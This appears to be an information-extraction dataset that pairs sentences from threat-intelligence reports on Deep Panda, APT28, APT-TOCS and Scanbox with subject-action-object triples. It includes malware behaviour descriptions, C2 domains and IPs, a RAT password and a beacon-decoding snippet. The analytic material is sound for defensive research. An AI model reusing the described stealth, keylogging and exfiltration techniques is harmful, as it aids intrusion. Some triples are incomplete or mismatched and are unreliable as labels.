using rundll32.exe, this executable will instantiate the DLL and can call a specific \nexported function": [{"spawns": {"A": "spawns", "S": "the sample", "O": ["using rundll32.exe", "a new process"]}}], "\n</section>\n\n<section>\n<heading>C2 Communication Mechanisms</heading>\nThe malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one\ncan be bundled in two different \u2018dual\u2019 modes (see 3.), totaling 7 distinct supported C2 mechanisms": [{"has": {"A": "has", "S": "The malware", "O": ["three distinct C2 protocols"]}}], " If no arguments are given, a connection to the C2 is initiated to the stati-\ncally defined IP address": [{"is initiated": {"A": "is initiated", "O": ["a connection to the C2", "to the stati- cally defined IP address"]}}, {"issued": {"A": "issued", "O": ["via the C2", "commands", "over a network based protocol"]}}], "\n\n\nThe following python function can be used to decode the beacon stings:\n<code>\n def decode(crypted):\n decoded=\u201d\u201d\n   for x in crypted:\n     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)\n   return decoded\n</code>\n\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE            6\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nAfter sending the initial beacon, the routine loops receiving incoming commands and executes them in\nsequence": [{"receiving": {"A": "receiving", "S": "the routine", "O": ["incoming commands"]}, "sending": {"A": "sending", "S": "the routine", "O": ["the initial beacon"]}, "executes": {"A": "executes", "S": "the routine", "O": ["them"]}}], " The malicious component in this case is what is commonly referred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed as a service": [{"installed": {"A": "installed", "O": ["a Dynamic Link Library (DLL)", "as a service"]}}], " Adds itself as a service name from the backdoor's configuration under HKEY_LOCAL_\n           MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>\u201d This defaults to \u201cwuauserv\u201d,\n           the legitimate Windows Update service, in the given binary's default configuration": [{"Adds": {"A": "Adds", "O": ["under HKEY_LOCAL_ MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>\u201d", "itself", "from the backdoor's configuration", "as a service name"]}}], "\n\nIn either case, the driver obtains the device object by using IoGetDeviceObjectPointer() and hooks Major\nFunction 14 the IRP_MJ_DEVICE_CONTROL, as this is the function through which all Input Output\nConTroLls (IOCTLs) are sent, such as the IOCTL for querying active IP connections": [{"hooks": {"A": "hooks", "S": "the driver", "O": ["Major Function 14 the IRP_MJ_DEVICE_CONTROL"]}}], " The standard output channel of that command is provided back to\nthe C2": [{"is provided": {"A": "is provided", "O": ["back to the C2", "The standard output channel of that command"]}}], " The\npurpose of the hook is to scan the list of active connections returned to the user, and hide any such\nconnection currently bound to a local TCP port in\n\n\n\n<footer>\nCROWDSTRIKE                                                                           S E N S I T I VE        15\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nthe range between 40000 and 45000": [{"scan": {"A": "scan", "S": "the hook", "O": ["the list of active connections returned to the user"]}, "hide": {"A": "hide", "S": "the hook", "O": ["any such connection currently bound to a local TCP port in the range between 40000 and 45000"]}}], "\n\n<figure></figure>\n\nThis inbound payload is received unconditionally and regardless of command type into a fixed-size stack \nbuffer of 408 bytes size": [{"is received": {"A": "is received", "O": ["This inbound payload"]}}], " It then checks for the values of the\n\u201cServiceDll\u201d and \u201cSecurity\u201d keys, in the latter case it applies an XOR on the data with the value 127": [{"checks": {"A": "checks", "S": "It", "O": ["for the values of the \u201cServiceDll\u201d and \u201cSecurity\u201d keys"]}}], " Once the proper API\u2019s have been resolved, the sample then\nassigns a NULL SID to the rundll32.exe executable and sets the current process\u2019 Window Station to\n\u201cwinsta0\u201d, which enables the sample to access the real user\u2019s desktop if started as service": [{"access": {"A": "access", "S": "the sample", "O": ["the real user\u2019s desktop", "if started as service"]}}], " This third component is likely used for long-term implantation and intelligence gathering": [{"is likely used": {"A": "is likely used", "O": ["for intelligence gathering", "This third component"]}}], " It is instantiated when it is mapped \ninto the process space of its dropped file, and its' export named 'OpenINFOPerformanceData' is called": [{"is mapped": {"A": "is mapped", "O": ["into the process space of its dropped file", "it"]}}], "\n\n\n<footer>\nCROWDSTRIKE                                                                         S E N S I T I VE             11\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nIf the current service name matches a set of pre-defined service names that legitimately exist in Windows, \nthe backdoor then loads the original service\u2019s DLL into the address space with LoadLibrary and invokes the\nServiceMain export": [{"loads": {"A": "loads", "S": "the backdoor", "O": ["the original service\u2019s DLL", "with LoadLibrary", "into the address space"]}}], " This activity is generally associated with log cleaning to com-\nplicate a forensic investigation": [{"is generally associated": {"A": "is generally associated", "S": "This activity", "O": ["with log cleaning to com- plicate a forensic investigation"]}}], " If the input is not in this list of built-in\ncommands, the malware attempts to invoke cmd.exe in the background, launching a command or command\nline utility already present on the system": [{"invoke": {"A": "invoke", "S": "the malware", "O": ["in the background", "cmd.exe"]}, "launching": {"A": "launching", "S": "the malware", "O": ["a command or command line utility already present on the system"]}}], "\n\nThe export \u2018CollectW3PerfData\u2019 is registered as the main function of the DLL": [{"is registered": {"A": "is registered", "O": ["The export \u2018CollectW3PerfData\u2019", "as the main function of the DLL"]}}], " This is typically seen in RATs for searching specific files to exfiltrate": [{"searching": {"A": "searching", "S": "RATs", "O": ["specific files"]}, "exfiltrate": {"A": "exfiltrate", "S": "RATs", "O": ["specific files"]}}], "\n\nThe malicious DLL file that is dropped is hidden in a resource of the dropper binary": [{"is hidden": {"A": "is hidden", "O": ["in a resource of the dropper binary", "The malicious DLL file that is dropped"]}}], " The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor": [{"be used": {"A": "be used", "O": ["as a backdoor", "itself"]}}, {"remove": {"A": "remove", "S": "a post exploitation tool", "O": ["log data"]}, "download": {"A": "download", "S": "a post exploitation tool"}, "infect": {"A": "infect", "S": "a post exploitation tool", "O": ["other systems"]}}], " This may be an\nattempt to fool some automated dynamic analysis or anti-malware software into believing this is the\nlegitimate ESET AV software": [{"fool": {"A": "fool", "O": ["some automated dynamic analysis or anti-malware software", "into believing this is the legitimate ESET AV software"]}}], "\n       w3.org/2001/XMLSchema\u201d>\n        <HostName> Infected System Hostname</HostName>\n        <int_0>-8</int_0>\n        <osVersion>Microsoft Windows NT 6.1.7601 Service Pack 1</osVersion>\n        <string_0>12/27/2011 16:34:36</string_0>\n        <Version>2</Version>\n       </BasicInfo>\n</code>\nCommand handling loop, this is a loop structure that will process and execute commands sent by the C2": [{"process and execute": {"A": "process and execute", "S": "Command handling loop", "O": ["commands sent by the C2"]}}], "\n\n\n\nThe sample is capable of 'dropping' an embedded/encrypted kernel driver": [{"'dropping'": {"A": "'dropping'", "S": "The sample", "O": ["an embedded/encrypted kernel driver"]}}], " The GET request serves as a down-stream\n          channel while the POST request serves as a upstream channel": [{"serves": {"A": "serves", "S": "The GET request", "O": ["as a down-stream channel"]}}], " This one HTTP connection will be used for bi-directional\n          communications, sending chunks of POST payload and receiving chunks of the response,\n          interleaved": [{"receiving": {"A": "receiving", "O": ["chunks of the response"]}}, {"sending": {"A": "sending", "O": ["chunks of POST payload"]}}], " If the service is present, the malware replaces its previous instances or\nversions of this backdoor": [{"replaces": {"A": "replaces", "S": "the malware", "O": ["its previous instances or versions of this backdoor"]}}], "\n\nThe communication to the C2 is handled by a while() loop, with each successive connection attempt\ncausing the loop to invoke the Windows Sleep() API for a time interval of 2 seconds, exponentially\nincreasing in length up to 1024 seconds (17 minutes) and then restarting back to 2 seconds": [{"is handled": {"A": "is handled", "O": ["The communication to the C2", "by a while() loop"]}}], " The screen captures are\ncreated using a series of Microsoft Windows Graphic Device Interface (GDI) API calls culminating in a call to\nGetDIBits()": [{"are created": {"A": "are created", "O": ["The screen captures", "using a series of Microsoft Windows Graphic Device Interface (GDI) API calls culminating in a call to GetDIBits()"]}}], " The\nfirst 16 bytes of this array are then used as the KEY and the second 16 bytes are used as the IV for setting \nup AES encryption which is then used to encrypt and decrypt any further communications": [{"encrypt and decrypt": {"A": "encrypt and decrypt", "S": "AES encryption", "O": ["any further communications"]}}], "\n</section>\n\n\n<footer>\n CROWDSTRIKE                                                                          S E N S I T I VE             25\n</footer> \n\f\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Implant #2</heading>\n<heading>Backdoor DLL</heading>\nThis DLL is a moderately sophisticated backdoor with several well designed communication mechanisms\nnot typically seen in these types of implants": [{"is": {"A": "is", "S": "This DLL", "O": ["a moderately sophisticated backdoor"]}}], " The command \n0x22000001 initiates continuous transmission of screen captures to the C2": [{"initiates": {"A": "initiates", "S": "The command 0x22000001", "O": ["continuous transmission of screen captures to the C2"]}}], "\n</section>\n\n<section>\n<heading>INTERNAL_CMD: Command-Line Shell</heading>\n\n\n\n<footer>\nCROWDSTRIKE                                                                         S E N S I T I VE          13\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nThis handler class uses the command ID 5 and implements an interactive command line shell accessible\nfrom the C2 server, containing a series of built-in commands": [{"implements": {"A": "implements", "S": "This handler class", "O": ["an interactive command line shell accessible from the C2 server"]}}], " Proprietary binary header (optionally over an HTTP Proxy using CONNECT mechanism); this\n          protocol consists of 64 random bytes being sent to the C2. The C2 then responds with 64 bytes\n          where the first four bytes must match the first four sent bytes to establish a connection \n          successfully": [{"being sent": {"A": "being sent", "O": ["to the C2", "64 random bytes"]}}], " Other domains resolving to the same IP include the following:\nBetween August 30, 2014 and September 16, 2014 we also observed SOGU (aka Kaba) callback traffic sent to assign.ddnsking.com over port 443": [{"sent": {"A": "sent", "O": ["over port 443", "SOGU (aka Kaba) callback traffic", "to assign.ddnsking.com"]}}], "\nThe Poison Ivy implant had the following configuration properties:\n<list>\nC2: quakegoogle.servequake.com, Port: 80\nPassword: qeTGd3485fF\nMutex: )!VoqA.I4\n</list>\nThe C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs": [{"resolved": {"A": "resolved", "S": "The C2 domain quakegoogle.servequake[.]com", "O": ["to 115.126.62.100", "at the time of the SWCs"]}}], " The threat group obfuscated the iframe on two of the compromised websites": [{"obfuscated": {"A": "obfuscated", "S": "The threat group", "O": ["the iframe", "on two of the compromised websites"]}}], " In turn, these exploits downloaded and decoded a payload hosted at: hxxp://103.27.108.45/img/js.php": [{"downloaded": {"A": "downloaded", "S": "these exploits", "O": ["a payload hosted at: hxxp://103.27.108.45/img/js.php"]}}], " The compromised websites contained an iframe to direct site visitors to a threat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims\u2019 systems": [{"dropped": {"A": "dropped", "S": "a threat actor-controlled IP address", "O": ["a Poison Ivy remote access tool (RAT)", "onto victims\u2019 systems"]}}, {"direct": {"A": "direct", "S": "an iframe", "O": ["to a threat actor-controlled IP address", "site visitors"]}}], " The group was able to compromise these websites and insert malicious iframes": [{"compromise": {"A": "compromise", "S": "The group", "O": ["these websites"]}, "insert": {"A": "insert", "S": "The group", "O": ["malicious iframes"]}}], "\nOrginaLFilename: chrome.exe\nLegalTrademarks:\nProductName: Google Chrome\nComparyShortName: Google\nLastChange: 265687\nFileDescription: Google Chrome\nOffcial Build: 1\nPriductVersion: 34.0.1847.131\nTranslation: 0\u00d70409 0x04b0\n</list>\nThis versioning info attempted to masquerade as a Google Chrome file": [{"masquerade": {"A": "masquerade", "S": "This versioning info", "O": ["as a Google Chrome file"]}}], "\nThe iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45": [{"directed": {"A": "directed", "S": "The iframes on these websites", "O": ["visitors", "to Java exploits hosted at 103.27.108.45"]}}], " This Javascript file is a framework for reconnaissance that the attackers call \"Scanbox\" and includes some of the techniques we described in a previous blog post: <list>Attackers abusing Internet Explorer to enumerate software and detect security products</list>\nThe Scanbox framework first configures the remote C&C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including:\n<list>\n      Referer\n      User-Agent\n      Location\n      Cookie\n      Title (To identify specific content that the victim is visiting)\n      Domain\n      Charset\n      Screen width and height\n      Operating System\n      Language\n</list>\nResulting in something like this:\nBefore sending the information to the C&C server, Scanbox encodes and encrypts the data with the following function:\nProducing the following request:\nIf we decrypt the data it translates to:\nAfter the first request, the framework contains several plugins to extract different information from the victim": [{"collects": {"A": "collects", "S": "The Scanbox framework", "O": ["about the victim that is visiting the compromised website", "a small amount of information"]}, "configures": {"A": "configures", "S": "The Scanbox framework", "O": ["the remote C&C server that it will use"]}}, {"encodes": {"A": "encodes", "S": "Scanbox"}, "encrypts": {"A": "encrypts", "S": "Scanbox"}, "sending": {"A": "sending", "S": "Scanbox", "O": ["to the C&C server", "the information"]}}, {"is": {"A": "is", "S": "This Javascript file", "O": ["a framework for reconnaissance"]}}, {"extract": {"A": "extract", "S": "the framework", "O": ["from the victim", "different information"]}, "Implements": {"A": "Implements", "S": "the framework", "O": ["a \u201ckeylogger\u201d functionality", "trough Javascript"]}, "logs": {"A": "logs", "S": "the framework", "O": ["all the keystrokes the victim is typing inside the compromised website"]}}], "\n</list>\nWhile the user is browsing the compromised website, all keystrokes are being recorded and sent to the C&C periodically": [{"sent": {"A": "sent", "S": "It", "O": ["to the C&C", "periodically"]}, "being recorded": {"A": "being recorded", "S": "It"}, "send": {"A": "send", "S": "It", "O": ["keystrokes", "when the user submits web forms that can potentially include passwords and other sensitive data"]}}], "\nThe attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server": [{"loaded": {"A": "loaded", "S": "code", "O": ["from a remote server", "a malicious Javascript file"]}}, {"compromise": {"A": "compromise", "S": "The attackers", "O": ["the website"]}}], "                                                               Page 10 </footer>\n\n<header> \f                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, accessing system passwords and so on": [{"executing": {"A": "executing", "S": "attack", "O": ["via PowerShell", "commands"]}, "execute": {"A": "execute", "S": "attack", "O": ["various operations"]}, "accessing": {"A": "accessing", "S": "attack", "O": ["system passwords"]}, "importing": {"A": "importing", "S": "attack", "O": ["PowerShell script"]}, "downloading": {"A": "downloading", "S": "attack", "O": ["files"]}, "uploading": {"A": "uploading", "S": "attack", "O": ["files"]}, "injecting": {"A": "injecting", "S": "attack", "O": ["keyboard recorder"]}}], "\nHere we can see both of them use Cookie to transmit information that has been encrypted, and send requests\nactively every 60 seconds": [{"encrypted": {"A": "encrypted", "S": "both of them", "O": ["information"]}, "use": {"A": "use", "S": "both of them", "O": ["Cookie", "to transmit information"]}, "send": {"A": "send", "S": "both of them", "O": ["requests"]}}], " This kind of attack pattern disguising as non-malicious real file in the host of its\ntarget, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie\nfield, all these features of this attack pattern are designed to evade the detection of security software and the\ninterception of firewall on the targeted host": [{"evade": {"A": "evade", "S": "all these features of this attack pattern", "O": ["the detection of security software"]}}, {"disguising": {"A": "disguising", "S": "This kind of attack pattern", "O": ["as non-malicious real file"]}}, {"sending": {"A": "sending", "S": "it", "O": ["a network heartbeat package"]}}, {"send": {"A": "send", "S": "it", "O": ["via the Cookie field", "data information"]}}], "\n\nCobalt Strike has the following characteristics:\n\n<list>\n     \uf06c    Penetrating sandbox\n\n     \uf06c    Avoiding whitelist mechanism and cloud detection\n\n     \uf06c    Intranet penetration\n\n     \uf06c    Persistent attacks\n\n     \uf06c    Attacking various platforms\n</list>\n</section>\n\n\n<section>\n<heading> 4 Conclusion </heading>\n\nWith an automated test platform Cobalt Strike, the attack penetration can penetrate firewall, the approach the\nattackers used to control targeted host is covert and undetectable; what\u2019s more, it can attack various platforms, such\n\n\n<footer> \u00a9 Antiy Labs": [{"penetrate": {"A": "penetrate", "S": "the attack penetration", "O": ["firewall"]}}], "\n</section>\n\n<section>\n<heading> 2 Analysis on incident sample </heading>\n\n\n2.1 Leading files and sample downloading\n\nAPT-TOCS used \u201cpowershell.exe\u201d to execute Shellcode scripts to realize remote control on targeted system": [{"realize": {"A": "realize", "S": "APT-TOCS", "O": ["on targeted system", "remote control"]}}], "\n\nJudging from the module strings and the system functions, the module belongs to backdoor program that can send\nGET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds\u2019 interval": [{"send": {"A": "send", "S": "backdoor program", "O": ["heartbeat packages", "by Cookie fields", "to designated addresses", "GET request"]}}], "\n\nThe reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it\u2019s a kind of\ntargeted attack (one of the features of APT attack), it has anti-detection functions and also it can conceal itself": [{"conceal": {"A": "conceal", "S": "it", "O": ["itself"]}, "has": {"A": "has", "S": "it", "O": ["anti-detection functions"]}}], " The data package is heartbeat": [{}], "\n\nThe core step of APT-TOCS is downloading the script functionalities of Shellcode, which downloads a field of data\ninto memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is\ngenerated by Cobalt Strike (An automatic attack testing platform)": [{"is downloading": {"A": "is downloading", "S": "APT-TOCS", "O": ["the script functionalities of Shellcode"]}}, {"downloads": {"A": "downloads", "S": "the script functionalities of Shellcode", "O": ["into memory", "a field of data"]}}], "                                                                       Page 3 </footer>\n\n\n<header> \f                                Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                                    <figure></figure>    <caption> Figure 5 Content of script 1 </caption>\n\nThe functionality of this part is: decrypting data with base64 encryption and getting module 1, then writing to\nprocess powershell.exe, and executing and operating": [{"writing": {"A": "writing", "S": "this part", "O": ["to process powershell.exe"]}}], " This implant\n             connected to a C2 node that overlapped with prennera[.]com": [{"connected": {"A": "connected", "S": "This implant", "O": ["to a C2 node that overlapped with prennera[.]com"]}}], " The SOURFACE\ndownloader then receives another dropper from its C2 server, and\nthis second dropper installs a second stage backdoor, which is\nusually EVILTOSS": [{"receives": {"A": "receives", "S": "The SOURFACE downloader", "O": ["another dropper", "from its C2 server"]}}, {"installs": {"A": "installs", "S": "this second dropper", "O": ["a second stage backdoor"]}}], " They may send spear phishing emails from\na specific IP address or email address": [{"send": {"A": "send", "S": "They", "O": ["from a specific IP address or email address", "spear phishing emails"]}}], " They steal data by configuring their\n       implants to send data out of the network using a victim\n       network\u2019s mail server": [{"steal": {"A": "steal", "S": "They", "O": ["data"]}}, {"send": {"A": "send", "S": "their implants", "O": ["data", "out of the network", "using a victim network\u2019s mail server"]}}], " This downloader obtains a\n     second-stage backdoor from a C2 server": [{"obtains": {"A": "obtains", "S": "This downloader", "O": ["from a C2 server", "a second-stage backdoor"]}}], " They work together         \nto gain access to their targets and steal data": [{"gain": {"A": "gain", "S": "They", "O": ["access to their targets"]}, "steal": {"A": "steal", "S": "They", "O": ["data"]}}], "    Communications with a C2 server using\n      HTTP": [{"using": {"A": "using", "S": "Communications with a C2 server", "O": ["HTTP"]}}], " The backdoor attempted to\nestablish a connection to a Georgian MIA mail\nserver and communicate via MIA email addresses\nending with \u201c@mia.ge.gov\u201d": [{"communicate": {"A": "communicate", "S": "The backdoor", "O": ["via MIA email addresses ending with \u201c@mia.ge.gov\u201d"]}, "establish": {"A": "establish", "S": "The backdoor", "O": ["a connection to a Georgian MIA mail server"]}}], " User activity is captured once every 500 milliseconds and logged in\nan HTML-like format": [{"is captured": {"A": "is captured", "O": ["User activity", "every 500 milliseconds", "once"]}, "logged": {"A": "logged", "O": ["User activity", "in an HTML-like format"]}}], " The text of the document\npurports to provide domain and user group setup\n\n<footnote>\n3\n    Georgian Ministry of Internal Affairs website http://police.ge/en/home\n4\n    Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi": [{"purports": {"A": "purports", "S": "The text of the document", "O": ["to provide domain and user group setup information for internal Windows XP and Windows 7 systems"]}}], " Messages are sent using HTTP\nPOST requests whose bodies contain encrypted\nand Base64 encoded data": [{"are sent": {"A": "are sent", "O": ["Messages", "using HTTP POST requests"]}}, {"contain": {"A": "contain", "S": "HTTP POST requests", "O": ["encrypted and Base64 encoded data"]}}], "\n 17           \u201c05\u201d                     OS Major version\n\n 19           \u201c01\u201d                     OS Minor version\n 1B           0x0000001a               Header length minus the command byte (LE DWORD)\n 1F           0x00000023               Length of the entire message (LE DWORD)\n</table>\n\n\n\n<footer>32 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\nCommands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST\nrequests": [{"are sent": {"A": "are sent", "O": ["in HTTP responses to the POST requests", "to the CORESHELL backdoor", "Commands", "from the C2 server"]}}], "\n\nAPT28 has registered domains similar to those of                      \nlegitimate Eastern European news sites and                            \ngovernments, listed in Table 2": [{"registered": {"A": "registered", "S": "APT28", "O": ["domains similar to those of legitimate Eastern European news sites and governments"]}}], " If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would\nbe written to disk and executed": [{"executed": {"A": "executed", "O": ["a DLL or EXE"]}, "be written": {"A": "be written", "O": ["a DLL or EXE", "to disk"]}}], "\n</footnote>\n\n<footer>37 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\nCHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes \u201c+\u201d and \u201c/\u201d for \u201c-\u201d and\n\u201c_\u201d, respectively": [{"uses": {"A": "uses", "S": "CHOPSTICK", "O": ["a URL-safe Base64 encoding", "using an alphabet that substitutes \u201c+\u201d and \u201c/\u201d for \u201c-\u201d and \u201c_\u201d, respectively"]}}], "                          \n                                                        \nSome of APT28\u2019s more commonly used tools are            \nthe SOURFACE downloader, its second stage               \nbackdoor EVILTOSS, and a modular family of              \nimplants that we call CHOPSTICK": [{"are": {"A": "are", "S": "Some of APT28\u2019s more commonly used tools", "O": ["the SOURFACE downloader"]}}], "\n\u2022    EVILTOSS: This backdoor has been delivered\n     through the SOURFACE downloader to gain\n     system access for reconnaissance,\n     monitoring, credential theft, and shellcode\n     execution": [{"been delivered": {"A": "been delivered", "O": ["through the SOURFACE downloader", "This backdoor"]}}, {"gain": {"A": "gain", "S": "This backdoor", "O": ["for reconnaissance"]}}], " These families             \nencode their strings at compile time using a      \ncustom stream cipher": [{"encode": {"A": "encode", "S": "These families", "O": ["using a custom stream cipher", "their strings", "at compile time"]}}], "\n</section>\n\n<footer>29 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX B:\nTIMELINE OF\nAPT28 LURES</heading>\n\n\n\n<table>\n YEAR LURE TOPIC                                                                                            MALWARE\n 2010      Iran\u2019s work with an international organization (internal document)                               SOURFACE\n\n                                                                                                            SOURFACE,\n 2011      File named \u201cmilitary cooperation.doc\u201d\n                                                                                                            OLDBAIT\n\n 2011      Georgian language IT document for Ministry of Internal Affairs (internal document)               SOURFACE\n\n           \u201cUSB Disk Security is the best software to block threats that can damage your PC or compromise\n 2011                                                                                                       SOURFACE\n           your personal information via USB storage.\u201d\n 2012      Food security in Africa (\u201cFood and nutrition crisis reaches peak but good forecast for 2013\u201d)    SOURFACE\n\n 2012      \u201cIDF Soldier Killed and another injured in a Terror Attack\u201d                                      SOURFACE\n\n 2012      \u201cEcho Crisis Report\u201d on Portugal\u2019s forest fires                                                  SOURFACE\n\n 2012      \u201cFBI to monitor Facebook, Twitter, Myspace\u201d                                                      SOURFACE\n\n 2012      Georgia (US state, not the country of Georgia) murder case uncovers terror plot                  SOURFACE\n\n 2012      Military attaches in London (internal document)                                                  SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      South Africa MFA document\n                                                                                                            CORESHELL\n\n 2013      John Shalikashvili (Georgian-Polish-American US General) Questionnaire                           CORESHELL\n\n 2013      Asia Pacific Economic Cooperation Summit 2013 reporters (internal document)                      SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      Defense Attaches in Turkey (internal document)\n                                                                                                            CORESHELL\n                                                                                                            CHOPSTICK,\n 2013      Turkish Cypriot news about Syria chemical weapons\n                                                                                                            CORESHELL\n\n 2013      Georgian language document about drivers\u2019 licenses (internal document)                           EVILTOSS\n\n 2013      Apparent Reason Magazine-related lure sent to a journalist                                       CORESHELL\n\n 2014      Mandarin language document, possibly related to a Chinese aviation group (non-public document)   CORESHELL\n\n 2014      Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack                 CORESHELL\n</table>\n</section>\n\n<footer>30 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX C:\nSOURFACE/CORESHELL</heading>\n\n\n\n\nSOURFACE is a downloader that obtains a second        \nstage backdoor from a C2 server": [{"obtains": {"A": "obtains", "S": "SOURFACE", "O": ["from a C2 server", "a second stage backdoor"]}, "is": {"A": "is", "S": "SOURFACE", "O": ["a downloader"]}}], " A SOURFACE sample employed\n      in the same Malaysia Airlines lure was\n      referenced by a Polish computer security\n      company in a blog post.<fn>12</fn> The Polish security\n      company indicated that the sample was \u201csent\n      to the government,\u201d presumably the Polish\n      government, given the company\u2019s location\n      and visibility": [{"employed": {"A": "employed", "O": ["A SOURFACE sample", "in the same Malaysia Airlines lure"]}}], " Until 2013, the\nSOURFACE downloader used hard-coded IP\naddresses for C2 communications, whereas the\nfuture CORESHELL samples use domains": [{"used": {"A": "used", "S": "the SOURFACE downloader", "O": ["hard-coded IP addresses", "for C2 communications"]}}, {"use": {"A": "use", "S": "the future CORESHELL samples", "O": ["domains"]}}], " The backdoor attaches this file to a\n preformatted email and sends it out through a\n victim\u2019s mail server": [{"attaches": {"A": "attaches", "S": "The backdoor", "O": ["to a preformatted email", "this file"]}}, {"sends": {"A": "sends", "O": ["out it", "through a victim\u2019s mail server"]}}], " In the background,\nthe decoy document installed a SOURFACE\nbackdoor on the victim\u2019s system": [{"installed": {"A": "installed", "S": "the decoy document", "O": ["a SOURFACE backdoor", "on the victim\u2019s system"]}}], "\nThis tactic could allow APT28 to obtain data from\nthe MIA\u2019s network through a less-monitored\nroute, limiting the MIA network security\ndepartment\u2019s abilities to detect the traffic": [{"obtain": {"A": "obtain", "S": "APT28", "O": ["from the MIA\u2019s network", "data", "through a less-monitored route"]}, "limiting": {"A": "limiting", "S": "APT28", "O": ["the MIA network security department\u2019s abilities to detect the traffic"]}}], "\n\nSeveral of the domains APT28 registered imitated\nNATO domain names, including those of NATO\nSpecial Operations Headquarters and the NATO\nFuture Forces Exhibition": [{"imitated": {"A": "imitated", "S": "Several of the domains APT28 registered", "O": ["NATO domain names"]}}], " It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)": [{"capturing": {"A": "capturing", "S": "a thread", "O": ["in JPEG format", "desktop screenshots"]}, "collects": {"A": "collects", "S": "a thread", "O": ["keystrokes"]}, "tracks": {"A": "tracks", "S": "a thread", "O": ["current window focus"]}, "records": {"A": "records", "S": "a thread", "O": ["user activity on the host"]}, "scrapes": {"A": "scrapes", "S": "a thread", "O": ["window contents (text, context menus, etc.)"]}}, {"creates": {"A": "creates", "S": "It", "O": ["a thread"]}}], " APT28 possibly crafted this document    \nto appear legitimate to all MIA system users and   \nintended to breach the MIA network specifically    \nusing the embedded malware": [{"crafted": {"A": "crafted", "S": "APT28", "O": ["this document", "to appear legitimate to all MIA system users"]}}], "\n\n\u2022     More recently, in August 2014 APT28 used a\n      lure (Figure 3) about hostilities surrounding a\n      Malaysia Airlines flight downed in Ukraine in\n      a probable attempt to compromise the Polish\n      government": [{"used": {"A": "used", "S": "APT28", "O": ["a lure (Figure 3) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine", "in a probable attempt to compromise the Polish government"]}}], " After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2": [{"sending": {"A": "sending", "S": "it", "O": ["an initial HTTP GET request"]}, "uploads": {"A": "uploads", "S": "it", "O": ["the file contents of edg6EF885E2. tmp", "using HTTP POST requests", "to the C2 server"]}}], " One APT28 domain imitated a key\nChechen-focused news website, while the other\nappeared to target members of the Armenian\nmilitary by hosting a fake login page": [{"target": {"A": "target", "S": "the other", "O": ["members of the Armenian military", "by hosting a fake login page"]}}, {"imitated": {"A": "imitated", "S": "One APT28 domain", "O": ["a key Chechen-focused news website"]}}], " CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the\nencrypted message in an edg6EF885E2.tmp temporary file": [{"stores": {"A": "stores", "S": "CHOPSTICK", "O": ["the encrypted message", "in an edg6EF885E2.tmp temporary file"]}, "encrypts": {"A": "encrypts", "S": "CHOPSTICK", "O": ["using RC4", "them"]}, "reads": {"A": "reads", "S": "CHOPSTICK", "O": ["messages", "from the mailslot"]}}], "\nJournalists critical of the Kremlin have long\nbeen targets of surveillance and harassment,\nand a number of governments and human\nrights organizations have publicly criticized the\ngovernment for its treatment of journalists and its\nincreasing consolidation of control over the media.<fn>9</fn>\n</section>\n\n<section>\n<heading>APT28\u2019s Other Targets in the Caucasus</heading>\nWe have seen APT28 register at least two\ndomains mimicking the domains of legitimate\norganizations in the Caucasus, as shown in the\ntable below": [{"register": {"A": "register", "S": "APT28", "O": ["at least two domains mimicking the domains of legitimate organizations in the Caucasus"]}}], " Web Enterprise Security\nMBAMService                                          Malwarebytes Anti-Malware\n</table>\n\n\n\n<footer>35 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\n <caption>Table 10: Applications detected by CHOPSTICK</caption>\n\n<table>\n\n Process Name\t                                               Application\n\n firefox.exe                                                 Mozilla Firefox\n iexplore.exe                                                Internet Explorer\n outlook.exe                                                 